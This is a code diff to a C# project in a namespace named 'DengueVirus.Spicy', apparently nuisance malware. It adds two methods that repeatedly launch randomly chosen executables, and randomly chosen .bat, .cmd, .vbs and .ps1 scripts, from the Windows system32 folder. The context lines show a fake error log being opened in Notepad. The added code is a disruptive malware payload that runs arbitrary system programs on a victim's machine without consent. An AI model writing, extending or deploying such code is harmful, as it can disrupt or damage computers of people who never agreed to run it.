@@ -63,5 +63,33 @@ namespace DengueVirus.Spicy
             File.WriteAllText("error_log.txt", contents);
             Process.Start("notepad.exe", "error_log.txt");
         }
+
+        public static void OpenRandomEXE()
+        {
+            // Open a random exe file from system32
+            string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.exe");
+            Random random = new Random();
+            for (int i = 0; i < 5; i++)
+            {
+                Process.Start(files[random.Next(files.Length)]);
+            }
+        }
+
+        public static void OpenRandomBatchFile()
+        {
+            // Open a random batch file from system32, .bat, .cmd, .vbs, .ps1
+            string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.bat");
+            string[] files2 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.cmd");
+            string[] files3 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.vbs");
+            string[] files4 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.ps1");
+            Random random = new Random();
+            for (int i = 0; i < 5; i++)
+            {
+                Process.Start(files[random.Next(files.Length)]);
+                Process.Start(files2[random.Next(files2.Length)]);
+                Process.Start(files3[random.Next(files3.Length)]);
+                Process.Start(files4[random.Next(files4.Length)]);
+            }
+        }
     }
 }
